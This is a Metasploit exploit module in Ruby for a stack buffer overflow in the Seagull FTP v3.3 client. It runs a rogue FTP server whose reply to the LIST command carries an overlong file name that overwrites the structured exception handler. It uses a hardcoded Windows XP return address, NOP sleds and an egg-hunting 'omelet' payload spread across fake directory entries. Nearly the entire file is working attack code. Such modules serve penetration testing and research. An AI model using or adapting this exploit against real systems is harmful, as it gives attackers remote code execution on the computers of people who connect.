##
# $Id: seagull_list_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Msf::Exploit::Omelet

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Seagull FTP v3.3 build 409 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the Seagull FTP client that gets
				triggered when the ftp clients processes a response to a LIST command. If the
				response contains an overly long file/folder name, a buffer overflow occurs,
				overwriting a structured exception handler.
			},
			'Author' 	 =>
				[
					'corelanc0d3r' # found bug, wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => '\x00',
					'StackAdjustment' => -1500,
					'DisableNops' => 'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP Universal', { 'Offset' => 232, 'Ret' => 0x7CE4650C } ], # jmp esp shell32.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))
	end

	#---------------------------------------------------------------------------------

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
		print_status("Handling LIST command")
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		crash = "A" * target['Offset']
		crash << [target.ret].pack('V')

		#corelanc0d3r's omelet mixin
		thepayload = ("\x90" * 30) + payload.encoded

		omeletoptions =
		{
			:eggsize => 123,
			:eggtag => "00w",
			:searchforward => true,
			:reset => false,
			:checksum => true
		}
		badchars = '\x00'
		omelet =  generate_omelet(thepayload,badchars,omeletoptions)

		omeletcode = omelet[0]
		print_status("[+] Omelet code : #{omeletcode.length} bytes")
		print_status("[+] Number of eggs : #{omelet[1].length}")
		print_status("[+] Sending payload")
		crash << ("\x90" * 30) + omeletcode

		print_status(" - Sending directory list via data connection")
		dirlist = ""

		omelet[1].each do |thischunk|
			print_status(" [+] Planted egg of #{thischunk.length} bytes")
			dirlist << "drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{thischunk}\r\n"
		end
		dirlist << "drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{crash}\r\n"
		conn.put("total #{omelet[1].length+1}\r\n"+dirlist)
		conn.close
		print_status(" - Wait for omelet hunter...")
		return
	end

end
